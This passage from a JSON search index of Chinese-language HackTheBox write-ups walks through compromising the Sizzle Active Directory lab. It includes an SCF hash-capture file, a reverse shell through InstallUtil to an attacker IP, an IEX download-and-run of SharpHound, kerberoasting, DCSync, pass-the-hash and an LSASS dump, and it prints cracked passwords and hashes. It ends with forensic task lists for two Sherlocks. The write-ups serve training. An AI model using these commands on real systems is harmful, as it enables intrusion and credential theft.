joe\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 jose\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 lkys37en\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 morgan\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 mrb3n\n\u2514\u2500\u2500 ZZ_ARCHIVE\n    \u251c\u2500\u2500 AddComplete.pptx\n    \u251c\u2500\u2500 AddMerge.ram\n    \u251c\u2500\u2500 ConfirmUnprotect.doc\n    \u251c\u2500\u2500 ConvertFromInvoke.mov\n    \u251c\u2500\u2500 ConvertJoin.docx\n    \u251c\u2500\u2500 CopyPublish.ogg\n    \u251c\u2500\u2500 DebugMove.mpg\n    \u251c\u2500\u2500 DebugSelect.mpg\n    \u251c\u2500\u2500 DebugUse.pptx\n    \u251c\u2500\u2500 DisconnectApprove.ogg\n    \u251c\u2500\u2500 DisconnectDebug.mpeg2\n    \u251c\u2500\u2500 EditCompress.xls\n    \u251c\u2500\u2500 EditMount.doc\n    \u251c\u2500\u2500 EditSuspend.mp3\n    \u251c\u2500\u2500 EnableAdd.pptx\n    \u251c\u2500\u2500 EnablePing.mov\n    \u251c\u2500\u2500 EnableSend.ppt\n    \u251c\u2500\u2500 EnterMerge.mpeg\n    \u251c\u2500\u2500 ExitEnter.mpg\n    \u251c\u2500\u2500 ExportEdit.ogg\n    \u251c\u2500\u2500 GetOptimize.pdf\n    \u251c\u2500\u2500 GroupSend.rm\n    \u251c\u2500\u2500 HideExpand.rm\n    \u251c\u2500\u2500 InstallWait.pptx\n    \u251c\u2500\u2500 JoinEnable.ram\n    \u251c\u2500\u2500 LimitInstall.doc\n    \u251c\u2500\u2500 LimitStep.ppt\n    \u251c\u2500\u2500 MergeBlock.mp3\n    \u251c\u2500\u2500 MountClear.mpeg2\n    \u251c\u2500\u2500 MoveUninstall.docx\n    \u251c\u2500\u2500 NewInitialize.doc\n    \u251c\u2500\u2500 OutConnect.mpeg2\n    \u251c\u2500\u2500 PingGet.dot\n    \u251c\u2500\u2500 ReceiveInvoke.mpeg2\n    \u251c\u2500\u2500 RemoveEnter.mpeg3\n    \u251c\u2500\u2500 RemoveRestart.mpeg\n    \u251c\u2500\u2500 RequestJoin.mpeg2\n    \u251c\u2500\u2500 RequestOpen.ogg\n    \u251c\u2500\u2500 ResetCompare.avi\n    \u251c\u2500\u2500 ResetUninstall.mpeg\n    \u251c\u2500\u2500 ResumeCompare.doc\n    \u251c\u2500\u2500 SelectPop.ogg\n    \u251c\u2500\u2500 SuspendWatch.mp4\n    \u251c\u2500\u2500 SwitchConvertFrom.mpg\n    \u251c\u2500\u2500 UndoPing.rm\n    \u251c\u2500\u2500 UninstallExpand.mp3\n    \u251c\u2500\u2500 UnpublishSplit.ppt\n    \u251c\u2500\u2500 UnregisterPing.pptx\n    \u251c\u2500\u2500 UpdateRead.mpeg\n    \u251c\u2500\u2500 WaitRevoke.pptx\n    \u2514\u2500\u2500 WriteUninstall.mp3\n\n52 directories, 52 files\n</code></pre> <ul> <li>\u65b0\u53d1\u73b0\u4e86\u4e00\u4e9b\u7528\u6237</li> </ul> <p></p> <ul> <li>\u5728 <code>ZZ_ARCHIVE</code> \u76ee\u5f55\u53d1\u73b0\u5f88\u591a\u5947\u602a\u7684\u6587\u4ef6</li> </ul> <p></p> <p></p> <p></p> <ul> <li>\u53c2\u8003\u8fd9\u4e9b\u6587\u4ef6\u7684\u6269\u5c55\u540d\uff0c\u521b\u5efa\u4e00\u4e9b Reverse Shell \u8bd5\u4e00\u4e0b</li> </ul> <p></p> <p></p> <ul> <li>\u4f46\u662f\u5e76\u6ca1\u6709\u6536\u5230 Reverse Shell</li> </ul> <p></p> <ul> <li>\u518d\u6b21\u67e5\u770b\uff0c\u8fd9\u4e9b\u6587\u4ef6\u4f3c\u4e4e\u88ab\u5220\u9664\u4e86\uff0c\u6216\u8005\u88ab\u79fb\u8d70\u4e86</li> </ul> <p></p> <ul> <li>\u8fd9\u91cc\u60f3\u5230 scf \u6587\u4ef6\uff0c\u5f53\u6253\u5f00 Windows \u8d44\u6e90\u7ba1\u7406\u5668\u65f6\uff0c\u4f1a\u81ea\u52a8\u6267\u884c scf \u6587\u4ef6\u5185\u90e8\u7684\u547d\u4ee4\uff0c\u53ef\u4ee5\u7528\u6765\u6293\u53d6 Hash</li> </ul> <pre><code>[Shell]\nCommand=2\nIconFile=\\\\10.10.16.18\\good.ico\n[Taskbar]\nCommand=ToggleDesktop\n</code></pre> <ul> <li>\u7b49\u5f85\u6587\u4ef6\u88ab\u5220\u9664\u6216\u79fb\u52a8\uff0c\u6700\u7ec8\u53d1\u73b0\u5728 <code>Users\\Public\\</code> \u76ee\u5f55\u4e0b\u7684 scf \u6587\u4ef6\u4f1a\u88ab\u52a0\u8f7d</li> </ul> <p></p> <ul> <li>Hashcat</li> </ul> <pre><code>hashcat -m 5600 hash.list /usr/share/wordlists/rockyou.txt\n---\nAMANDA::HTB:435b6869c0c9c39b:0df7710f7a8025de72c2cd86601b85aa:010100000000000000d991387349da014f969a8839060e0900000000020008004f00460049004c0001001e00570049004e002d004f00350034005500440035004300570045005000450004003400570049004e002d004f0035003400550044003500430057004500500045002e004f00460049004c002e004c004f00430041004c00030014004f00460049004c002e004c004f00430041004c00050014004f00460049004c002e004c004f00430041004c000700080000d991387349da0106000400020000000800300030000000000000000100000000200000dafb26a7ca41bc216510f28bf1ffedda164c92afa5b7470d176278593e4d22f30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e0031003800000000000000000000000000:Ashare1972\n</code></pre> <ul> <li>\u5bc6\u7801\u55b7\u5c04 </li> </ul> <p></p> <p>\u4f46\u662f\u90fd\u65e0\u6cd5\u8fde\u63a5 winrm</p> <p></p>"}, {"location": "HackTheBox/Machines/Sizzle/#_2", "title": "\u4fe1\u606f\u6536\u96c6", "text": "<ul> <li>\u905b\u72d7\uff0c\u53d1\u73b0\u6b64\u7528\u6237\u65f6\u8bc1\u4e66\u670d\u52a1\u8d26\u53f7</li> </ul> <p>\u4e5f\u53ef\u4ee5\u8fdc\u7a0b\u767b\u5f55\uff0c\u5224\u65ad\u767b\u5f55\u9700\u8981\u8bc1\u4e66</p> <p></p> <ul> <li>amanda \u53ef\u4ee5\u8bbf\u95ee\u66f4\u591a\u7684\u5171\u4eab\u76ee\u5f55</li> </ul> <p></p> <ul> <li>\u5728 CertEnroll \u53d1\u73b0\u4e86\u4e00\u4e9b\u8bc1\u4e66</li> </ul> <p></p> <p>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates#request-certificates</p> <p>\u53d1\u73b0\u4e00\u4e9b Web \u8def\u5f84</p> <p></p> <ul> <li>\u53d1\u73b0 CertSrv \u76ee\u5f55\u9700\u8981\u8ba4\u8bc1</li> </ul> <p></p> <ul> <li><code>amanda/Ashare1972</code> \u8ba4\u8bc1\u6210\u529f</li> </ul> <p></p>"}, {"location": "HackTheBox/Machines/Sizzle/#_3", "title": "\u7533\u8bf7\u57df\u8bc1\u4e66", "text": "<ul> <li>\u9996\u5148\u672c\u5730\u751f\u6210\u4e00\u4e2a\u8bc1\u4e66</li> </ul> <pre><code># \u521b\u5efa\u79c1\u94a5\uff0c\u9700\u8981 4 \u4f4d\u4ee5\u4e0a\u7684\u5bc6\u7801\nopenssl genrsa -des3 -out amanda.key 2048\n# \u7528\u79c1\u94a5\u751f\u6210\u4e00\u4e2a\u8bc1\u4e66\u7b7e\u540d\u8bf7\u6c42\u7684 csr \u6587\u4ef6\nopenssl req -new -key amanda.key -out amanda.csr\nls -la amanda.*\n</code></pre> <p>\u63d0\u4ea4 amanda.csr \u6587\u4ef6\u7533\u8bf7\u8bc1\u4e66</p> <p></p> <ul> <li>\u4e0b\u8f7d Base64 \u7f16\u7801\u7684\u8bc1\u4e66</li> </ul> <p></p> <p></p> <ul> <li>\u5c1d\u8bd5\u8fdc\u7a0b\u767b\u5f55\uff0c\u6dfb\u52a0\u8bc1\u4e66\u3001\u79c1\u94a5\uff0c \u767b\u5f55\u6210\u529f</li> </ul> <p></p> <ul> <li>\u51c6\u5907\u8dd1 winPEAS \u548c \u518d\u6b21\u905b\u72d7\uff0c\u53d1\u73b0\u76ee\u524d Shell \u53d7\u9650\u5236</li> </ul> <p></p> <pre><code>$executioncontext.sessionstate.languagemode\n</code></pre> <p></p>"}, {"location": "HackTheBox/Machines/Sizzle/#shell-as-user-mrlky", "title": "Shell as User - mrlky", "text": "<ul> <li>\u4f7f\u7528 PSByPassCLM \u7a81\u7834</li> </ul> <p>https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs#bypass-1</p> <p>https://github.com/padovah4ck/PSByPassCLM</p> <ul> <li>\u4e0b\u8f7d\u4f5c\u8005\u7f16\u8bd1\u7684 exe</li> </ul> <p>https://github.com/padovah4ck/PSByPassCLM/raw/master/PSBypassCLM/PSBypassCLM/bin/x64/Debug/PsBypassCLM.exe</p> <pre><code>wget http://10.10.16.18/PsBypassCLM.exe -O PsBypassCLM.exe\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.16.18 /rport=2233 PsBypassCLM.exe\n</code></pre> <p></p> <p>\u6210\u529f\u7ed5\u8fc7 CLM</p> <ul> <li>\u518d\u6b21\u5c1d\u8bd5\u905b\u72d7</li> </ul> <pre><code>IEX(New-Object Net.Webclient).downloadstring(\"http://10.10.16.18/SharpHound.ps1\")\nInvoke-BloodHound -CollectionMethod All\n# \u590d\u5236\u5230\u672c\u673a\u7684 Samba Share \u76ee\u5f55\ncp C:\\users\\amanda\\Documents\\20240118010043_BloodHound.zip \"C:\\Department Shares\\Users\\Public\\20240118010043_BloodHound.zip\"\n</code></pre> <ul> <li>\u53e6\u5916\u5728\u673a\u5668\u5185\u53d1\u73b0 88 \u7aef\u53e3\u5f00\u653e</li> </ul> <p></p> <ul> <li>\u4e0a\u4f20 Rubeus \u5229\u7528 kerberoast\uff0c\u4e5f\u53ef\u4ee5\u7aef\u53e3\u6620\u5c04\uff0c\u672c\u5730\u4f7f\u7528 impacket \u5229\u7528</li> </ul> <pre><code># \u5fc5\u987b\u5728 C:\\Windows\\Temp \u76ee\u5f55\nwget http://10.10.16.18/Rubeus.exe -O c:\\Windows\\Temp\\Rubeus.exe\n./Rubeus.exe kerberoast /creduser:htb.local\\amanda /credpassword:Ashare1972\n</code></pre> <p></p> <ul> <li><code>hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt</code> \u5f97\u5230\u51ed\u636e <code>mrlky/Football#7</code></li> </ul> <p>\u55b7\u5c04\u5bc6\u7801\uff08\u4e24\u4e2a\u5bc6\u7801\u90fd\u6b63\u786e\u7684\u8d26\u53f7\u53ef\u4ee5\u5ffd\u7565\uff09</p> <p></p> <ul> <li>\u6ca1\u6709\u53d1\u73b0\u65b0\u7684 Samba Share \u76ee\u5f55</li> </ul> <p></p> <ul> <li>\u540c\u6837\u7684\u8fc7\u7a0b\u521b\u5efa mrlky \u7684\u8bc1\u4e66</li> </ul> <pre><code>openssl genrsa -out mrlky.key 2048              # \u751f\u6210\u65e0\u52a0\u5bc6\u79c1\u94a5\nopenssl req -new -key mrlky.key -out mrlky.csr  # \u751f\u6210\u7b7e\u540d\u8bf7\u6c42\n</code></pre> <ul> <li>\u767b\u5f55 Winrm <code>evil-winrm -i $IP -u mrlky -p 'Football#7' -c mrlky.cer -k mrlky.key -S</code></li> </ul> <p></p> <p></p> <ul> <li>\u73af\u5883\u4e5f\u4e0d\u662f\u5f88\u5065\u5eb7\uff0c\u540c\u6837\u7684\u65b9\u6cd5\u7ed5\u8fc7 CLM</li> </ul> <p></p> <pre><code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.16.18 /rport=2233 PsBypassCLM.exe\n</code></pre> <ul> <li>\u905b\u4e00\u4e0b\u72d7</li> </ul> <pre><code>IEX(New-Object Net.Webclient).downloadstring(\"http://10.10.16.18/SharpHound.ps1\")\nInvoke-BloodHound -CollectionMethod All\n# \u590d\u5236\u5230\u672c\u673a\u7684 Samba Share \u76ee\u5f55\ncp C:\\Users\\mrlky.HTB\\Documents\\20240118024954_BloodHound.zip \"C:\\Department Shares\\Users\\Public\\20240118024954_BloodHound.zip\"\n</code></pre>"}, {"location": "HackTheBox/Machines/Sizzle/#shell-as-root", "title": "shell as root", "text": "<ul> <li>\u53d1\u73b0 DCSync \u6743\u9650</li> </ul> <ul> <li>Dump Hash <code>impacket-secretsdump htb.local/mrlky:\"Football#7\"@$IP</code></li> </ul> <ul> <li>\u767b\u5f55 Administrator <code>impacket-psexec htb.local/Administrator@$IP -hashes 'aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267'</code></li> </ul>"}, {"location": "HackTheBox/Machines/Sizzle/#dump-hash", "title": "Dump Hash", "text": "<pre><code>lsassy HTB.LOCAL -u Administrator -H 'f6b7160bfc91823792e0ac3a162c9267' -dc-ip $IP -v\n---\n[*] HTB.LOCAL SMB session opened\n[+] HTB.LOCAL Authentication successful\n[*] HTB.LOCAL Dumping via lsassy.dumpmethod.comsvcs\n[*] HTB.LOCAL Trying smb method\n[*] HTB.LOCAL Executing using lsassy.exec.smb\n[*] HTB.LOCAL /Windows/Temp//7nYHjX.png handle acquired\n[+] HTB.LOCAL Lsass dumped in C:\\Windows\\Temp\\7nYHjX.png (149027262 Bytes)\n[+] HTB.LOCAL Lsass dump deleted\n[+] HTB.LOCAL HTB\\amanda         [NT] 7d0516ea4b6ed084f3fdf71c47d9beb3 | [SHA1] 66d1e951d372209e6cad25f000fcd0312c85c4ea\n[+] HTB.LOCAL HTB\\SIZZLE$        [NT] c76bc1642b745165267bf22d9edac0d5 | [SHA1] 21bd4823a3537c4c37092a7b949863706032c1bf\n[+] HTB.LOCAL HTB.LOCAL\\SIZZLE$  [PWD] d090fb614208d02940caae37b41dc3acf6ad6c6277a3c1a8c38771f3edf8b1e119176aa4f0fd60668e3ee3395666617d3fe9f930d090d3dc1c54ceec6817a0739e036a83f7ecd1f0a1a27c067838fa3b976074a10ff87fbd1fff158a7625bfabfab4b221d32680c278aa7fb6ceaaf25d0a1554eb11f131e1a9da797d6f23d3ecafad404ae54ac3995a5543cbd1178283bdedf53958a260e9dd04c362039f89da205c0748e68942e466855437048b369995121ae23341c4bee6333cf122ae854f848a088cf24d3a906cff27e9c4f5324088a0cb8632558d868edd098280c765891a1d8a44a2d17393b335edcdae657dfd\n[+] HTB.LOCAL HTB\\SIZZLE$        [NT] 512129f37dd545e3abac3b20133fcf42 | [SHA1] e6a0befa1a663db193b9a7ccdc0f2ff420f87186\n[+] HTB.LOCAL HTB.LOCAL\\SIZZLE$  [PWD] 943bc7c9c31e2c0ba2954a15e989ab2e3287e6e51e09b15ce923f913e6efa8bd9350364356bf5d267e734bb14e4a4badbc1d45999eb91ef3f2adbe76f4821434f30e46405183f5b2aee9d6a51d2fc543951ab6b5fca1e5ba9f8cf97ec973c60e19768baaeb0ddb16269eb7c456659dc92415fefa7423830306fb301d5d867b8bb1214177b531c631d203fae4176cd16c645444fc701265b47cf69ea0a87feb4b0c459bb82686f6a368e56ff3c94721b947b9ac23ffb85f8223dc8c3c2158dcc6ddc5a92dbb1e35738017a328fc455264718c154fa4056c41b6066ad0f21fe5bd2289586c3ac7563e3de63a3735cb290d\n[+] HTB.LOCAL HTB.LOCAL\\amanda   [TGT] Domain: HTB.LOCAL - End time: 2024-01-18 09:36 (TGT_HTB.LOCAL_amanda_krbtgt_HTB.LOCAL_50ec6be6.kirbi)\n[+] HTB.LOCAL HTB.LOCAL\\SIZZLE$  [TGT] Domain: HTB.LOCAL - End time: 2024-01-18 09:37 (TGT_HTB.LOCAL_SIZZLE$_krbtgt_HTB.LOCAL_95ef3405.kirbi)\n[+] HTB.LOCAL HTB.LOCAL\\SIZZLE$  [TGT] Domain: HTB.LOCAL - End time: 2024-01-18 08:37 (TGT_HTB.LOCAL_SIZZLE$_krbtgt_HTB.LOCAL_30789646.kirbi)\n[+] HTB.LOCAL HTB.LOCAL\\SIZZLE$  [TGT] Domain: HTB.LOCAL - End time: 2024-01-18 08:37 (TGT_HTB.LOCAL_SIZZLE$_krbtgt_HTB.LOCAL_0db93974.kirbi)\n[+] HTB.LOCAL HTB.LOCAL\\SIZZLE$  [TGT] Domain: HTB.LOCAL - End time: 2024-01-18 08:37 (TGT_HTB.LOCAL_SIZZLE$_krbtgt_HTB.LOCAL_2686efc4.kirbi)\n[+] HTB.LOCAL 28 Kerberos tickets written to /home/kali/.config/lsassy/tickets\n[+] HTB.LOCAL 11 masterkeys saved to /home/kali/.config/lsassy/masterkeys.txt\n</code></pre>"}, {"location": "HackTheBox/Sherlocks/OpTinselTrace-5/", "title": "OpTinselTrace 5", "text": "<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/C%3A/Windows/System32/config]\n\u2514\u2500$ impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local -pwd-last-set -user-status -history\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Target system bootKey: 0x06326087bd0dc6172e31701ef27024d5\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:b473c2b77b3a05800fd7c304fb1f1b37:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[*] Dumping cached domain logon information (domain/username:hash)\n[*] Dumping LSA Secrets\n[*] $MACHINE.ACC \n$MACHINE.ACC:plain_password_hex:63003000460040005500400057004600210053003c0044005c003a00690056002200220046005f0079002c007700450042003100290053002d006a004a006a004a0025004b0071005a0042003b004c0057005b00350056005b003100440047003f005e00770065005300250069003a0073006d004c0074002b004f0037003e0033002f00450060003d003b0048004e002700540026003400350035002f004d0036005c0052006a00560046005f00350039002d00610046005e0040002f004900550021003c00340064002f002b0063004a00250060006f003000660034002f00200061003600660049002d002b004600\n$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:53da7cc22771a35b151b4bbb3ff143ad\n[*] $MACHINE.ACC_history \n$MACHINE.ACC:plain_password_hex:dfeef9b6828781f822dc49d8cacfe2a6d418196ec18df74070b078fb53ccf4017d61665edd7ddfef12f1a66a9c2ea295e92efe0cd59a5128acef45a00fb837e76b6ad349956dab1af6df16c2024b6eb0e52c74ea8c2e86c77c882bbd611b9fa85ee424968a1a849381d1022a46cd18575ec0d6b8568aeda9a91611beb6357d4b81389f455c26f294b3a8672d1284e7f39efb836f4c8db86dbc0b87ea2a3af3e8d72ec326f800c8e3b0c8328d782563aa88889ada07d8b5dc3efe89f56522a9141e2b66d1db719050e9ebde58ea7aabba80e9ac071ac27695f9cf1832ea6fac953d500de4a954e3a7d07bf919ddd30056\n$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:5998b3332d3591edbea01a7d315ddf2b\n[*] DPAPI_SYSTEM \ndpapi_machinekey:0xed8d2c90415e02e01b3be3d51a81cc1dbaf5f9dd\ndpapi_userkey:0x77b9dde8f1fc0bdfe8c7196832f674f7b36563d1\n[*] DPAPI_SYSTEM_history \ndpapi_machinekey:0xd6701523fcee9c510499273c7d6ed1104ea692cb\ndpapi_userkey:0x1e0cbfd9a7fbaa327565c5b783775fe597e29bda\n[*] NL$KM \n 0000   A8 4F 91 67 0E A4 59 0F  7E 25 B4 A1 0B A8 F8 B3   .O.g..Y.~%......\n 0010   D6 B8 EF AF E2 24 70 D1  43 75 95 F8 37 97 E3 CE   .....$p.Cu..7...\n 0020   7D 43 3F 15 24 C6 C2 29  84 12 51 62 47 7E D6 8D   }C?.$..)..QbG~..\n 0030   19 E5 AA 8B 62 1F 5D 9A  5A 0E BE 39 53 86 8F 3A   ....b.].Z..9S..:\nNL$KM:a84f91670ea4590f7e25b4a10ba8f8b3d6b8efafe22470d1437595f83797e3ce7d433f1524c6c22984125162477ed68d19e5aa8b621f5d9a5a0ebe3953868f3a\n[*] NL$KM_history \n 0000   A8 4F 91 67 0E A4 59 0F  7E 25 B4 A1 0B A8 F8 B3   .O.g..Y.~%......\n 0010   D6 B8 EF AF E2 24 70 D1  43 75 95 F8 37 97 E3 CE   .....$p.Cu..7...\n 0020   7D 43 3F 15 24 C6 C2 29  84 12 51 62 47 7E D6 8D   }C?.$..)..QbG~..\n 0030   19 E5 AA 8B 62 1F 5D 9A  5A 0E BE 39 53 86 8F 3A   ....b.].Z..9S..:\nNL$KM_history:a84f91670ea4590f7e25b4a10ba8f8b3d6b8efafe22470d1437595f83797e3ce7d433f1524c6c22984125162477ed68d19e5aa8b621f5d9a5a0ebe3953868f3a\n[*] Cleaning up...\n</code></pre>"}, {"location": "HackTheBox/Sherlocks/Safecracker/", "title": "Safecracker", "text": "<p>https://app.hackthebox.com/sherlocks/Safecracker</p> <p>We recently hired some contractors to continue the development of our Backup services hosted on a Windows server. We have provided the contractors with accounts for our domain. When our system administrator recently logged on, we found some pretty critical files encrypted and a note left by the attackers. We suspect we have been ransomwared. We want to understand how this attack happened via a full in-depth analysis of any malicious files out of our standard triage. A word of warning, our tooling didn't pick up any of the actions carried out - this could be advanced. Warning This is a warning that this Sherlock includes software that is going to interact with your computer and files. This software has been intentionally included for educational purposes and is NOT intended to be executed or used otherwise. Always handle such files in isolated, controlled, and secure environments. One the Sherlock zip has been unzipped, you will find a DANGER.txt file. Please read this to proceed.</p>"}, {"location": "HackTheBox/Sherlocks/Safecracker/#tasks", "title": "Tasks", "text": "<ul> <li> Task 1 - Which user account was utilised for initial access to our company server?</li> <li> Task 2 - Which command did the TA utilise to escalate to SYSTEM after the initial compromise?</li> <li> Task 3 - How many files have been encrypted by the the ransomware deployment?</li> <li> Task 4 - What is the name of the process that the unpacked executable runs as?</li> <li> Task 5 - What is the XOR key used for the encrypted strings?</li> <li> Task 6 - What encryption was the packer using?</li> <li> Task 7 - What was the encryption key and IV for the packer?</li> <li> Task 8 - What was the name of the memoryfd the packer used?</li> <li> Task 9 - What was the target directory for the ransomware?</li> <li> Task 10 - What compression library was used to compress the packed binary?</li> <li> Task 11 - The binary appears to check for a debugger, what file does it check to achieve this?</li> <li> Task 12 - What exception does the binary raise?</li> <li> Task 13 - Out of this list, what extension is not targeted by the malware?(.pptx,.pdf,.tar.gz,.tar,.zip,.exe,.mp4,.mp3)</li> <li> Task 14 - What compiler was used to create the malware?</li> <li> Task 15 - If the malware detects a debugger, what string is printed to the screen?</li> <li> Task 16 - What is the contents of the .comment section?</li> <li> Task 17 - What file extension does the ransomware rename files to?</li> <li> Task 18 - What is the bitcoin address in the ransomware note?</li> <li> Task 19 - What string does the binary look for when looking for a debugger?</li> <li> Task 20 - It appears that the attacker has bought the malware strain from another hacker, what is their handle?</li> <li> Task 21 - What system call is utilised by the binary to list the files within the targeted directories?</li> <li> Task 22 - Which system call is used to delete the original files?</li> </ul>"}, {"location": "HackTheBox/Sherlocks/Safecracker/#data-format", "title": "Data Format", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#windows", "title": "Windows \u4e8b\u4ef6\u65e5\u5fd7", "text": "<p>https://github.com/WithSecureLabs/chainsaw</p> <pre><code>chainsaw hunt \"safecracker\\WinServer-Collection\\uploads\\auto\\C%3A\\Windows\\System32\\winevt\\Logs\" -s C:\\opt\\chainsaw\\sigma\\ --mapping C:\\opt\\chainsaw\\mappings\\sigma-event -logs-all.yml -r C:\\opt\\chainsaw\\rules\\ --full -o export\\evtx_hunt.log\n</code></pre>"}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-1-which-user-account-was-utilised-for-initial-access-to-our-company-server", "title": "Task 1 - Which user account was utilised for initial access to our company server?", "text": "<p>contractor01</p> <ul> <li>\u67e5\u627e\u767b\u5f55\u65e5\u5fd7</li> </ul> <p></p>"}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-2-which-command-did-the-ta-utilise-to-escalate-to-system-after-the-initial-compromise", "title": "Task 2 - Which command did the TA utilise to escalate to SYSTEM after the initial compromise?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-3-how-many-files-have-been-encrypted-by-the-the-ransomware-deployment", "title": "Task 3 - How many files have been encrypted by the the ransomware deployment?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-4-what-is-the-name-of-the-process-that-the-unpacked-executable-runs-as", "title": "Task 4 - What is the name of the process that the unpacked executable runs as?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-5-what-is-the-xor-key-used-for-the-encrypted-strings", "title": "Task 5 - What is the XOR key used for the encrypted strings?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-6-what-encryption-was-the-packer-using", "title": "Task 6 - What encryption was the packer using?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-7-what-was-the-encryption-key-and-iv-for-the-packer", "title": "Task 7 - What was the encryption key and IV for the packer?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-8-what-was-the-name-of-the-memoryfd-the-packer-used", "title": "Task 8 - What was the name of the memoryfd the packer used?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-9-what-was-the-target-directory-for-the-ransomware", "title": "Task 9 - What was the target directory for the ransomware?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-10-what-compression-library-was-used-to-compress-the-packed-binary", "title": "Task 10 - What compression library was used to compress the packed binary?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-11-the-binary-appears-to-check-for-a-debugger-what-file-does-it-check-to-achieve-this", "title": "Task 11 - The binary appears to check for a debugger, what file does it check to achieve this?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-12-what-exception-does-the-binary-raise", "title": "Task 12 - What exception does the binary raise?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-13-out-of-this-list-what-extension-is-not-targeted-by-the-malwarepptxpdftargztarzipexemp4mp3", "title": "Task 13 - Out of this list, what extension is not targeted by the malware?(.pptx,.pdf,.tar.gz,.tar,.zip,.exe,.mp4,.mp3)", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-14-what-compiler-was-used-to-create-the-malware", "title": "Task 14 - What compiler was used to create the malware?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-15-if-the-malware-detects-a-debugger-what-string-is-printed-to-the-screen", "title": "Task 15 - If the malware detects a debugger, what string is printed to the screen?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-16-what-is-the-contents-of-the-comment-section", "title": "Task 16 - What is the contents of the .comment section?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-17-what-file-extension-does-the-ransomware-rename-files-to", "title": "Task 17 - What file extension does the ransomware rename files to?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-18-what-is-the-bitcoin-address-in-the-ransomware-note", "title": "Task 18 - What is the bitcoin address in the ransomware note?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-19-what-string-does-the-binary-look-for-when-looking-for-a-debugger", "title": "Task 19 - What string does the binary look for when looking for a debugger?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-20-it-appears-that-the-attacker-has-bought-the-malware-strain-from-another-hacker-what-is-their-handle", "title": "Task 20 - It appears that the attacker has bought the malware strain from another hacker, what is their handle?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-21-what-system-call-is-utilised-by-the-binary-to-list-the-files-within-the-targeted-directories", "title": "Task 21 - What system call is utilised by the binary to list the files within the targeted directories?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#task-22-which-system-call-is-used-to-delete-the-original-files", "title": "Task 22 - Which system call is used to delete the original files?", "text": ""}, {"location": "HackTheBox/Sherlocks/Safecracker/#attack-map", "title": "Attack Map", "text": ""}]}